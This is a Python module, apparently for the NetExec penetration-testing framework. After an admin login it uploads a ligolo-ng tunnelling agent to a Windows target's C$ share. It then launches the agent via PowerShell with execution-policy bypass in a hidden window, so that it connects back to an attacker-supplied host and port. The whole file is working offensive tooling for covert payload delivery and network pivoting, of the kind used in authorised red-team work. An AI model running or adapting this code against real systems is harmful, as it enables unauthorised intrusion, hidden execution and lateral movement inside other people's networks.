from nxc.helpers.misc import CATEGORY
from pathlib import Path


class NXCModule:
    """Module for uploading and executing the ligolo-ng agent"""

    name = "proxy_agent"
    description = "Upload and execute the ligolo-ng agent on the target system"
    supported_protocols = ["smb", "mssql", "ssh", "ftp", "nfs"]
    category = CATEGORY.ENUMERATION

    def options(self, context, module_options):
        r"""
        AGENT_PATH: Path to the ligolo-ng agent (Default: ~/opt/ligolo_agents/agent.exe)
        PATH: Path on the target to save the file (Default: C:\\Users\\Public\\agent.exe)
        LHOST: IP address of the attacker's machine (Compulsory)
        LPORT: Listening port on the attacker's machine (Default: 11601)
        """
        self.agent_path = module_options.get("AGENT_PATH") or str(
            Path.home() / "opt/ligolo_agents/agent.exe"
        )
        self.path = module_options.get(
            "PATH") or "C:\\Users\\Public\\agent.exe"
        self.lport = module_options.get("LPORT") or 11601
        self.lhost = module_options.get("LHOST") or None
        if self.lhost is None:
            context.log.fail("LHOST is a required option")
            exit(1)

    def on_admin_login(self, context, connection):
        remote_path = self.path.split(":")[-1]
        share = "C$"
        try:
            with open(self.agent_path, "rb") as f:
                connection.conn.putFile(share, remote_path, f.read)
            context.log.success(
                f"Successfully uploaded the agent to {self.path}")
        except Exception as e:
            context.log.fail(f"Failed to upload the agent: {e}")
            exit(1)

        try:
            command = (
                f"powershell -ExecutionPolicy Bypass -c "
                f"Start-Process -WindowStyle hidden {self.path} "
                f"-ArgumentList '-ignore-cert -connect {self.lhost}:{self.lport}'"
            )
            connection.execute(command)
            context.log.success("Executing the agent...")
        except Exception as e:
            context.log.fail(f"Failed to execute the agent: {e}")
